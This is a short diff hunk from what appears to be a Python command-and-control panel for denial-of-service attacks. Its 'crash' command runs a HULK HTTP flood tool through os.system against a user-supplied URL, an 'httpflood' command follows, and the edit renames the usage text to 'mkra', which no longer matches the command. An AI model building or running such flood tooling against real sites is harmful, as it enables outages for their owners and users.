@@ -4,7 +4,7 @@ elif "crash" in cnc:
                 method = cnc.split()[2]
                 os.system(f'go run Hulk.go -site {url} -data {method}')
             except IndexError:
-                print('Usage: crash <url> METHODS<GET/POST>')
+                print('Usage: mkra <url> METHODS<GET/POST>')
                 print('Example: crash http://example.com GET')
 
         elif "httpflood" in cnc:
